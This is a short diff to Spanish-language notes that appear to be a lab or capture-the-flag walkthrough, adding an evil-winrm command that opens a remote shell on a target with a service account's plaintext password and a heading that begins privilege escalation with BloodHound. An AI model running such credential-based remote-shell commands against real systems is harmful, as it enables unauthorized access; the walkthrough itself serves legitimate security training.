@@ -164,4 +164,9 @@ Verificamos si corresponde al grupo de Remote Management
 `netexec winrm $IP -u 'svc_loanmgr' -p 'Moneymakestheworldgoround!'`
 
 Y ahora nos conectamos con [[EVIL_WINRM]]
+`evil-winrm -i $IP -u 'svc_loanmgr' -p 'Moneymakestheworldgoround!`
 
+
+### Escalada de privilegios
+
+Empezaremos a enumerar ahora con `BLOODHAUND`
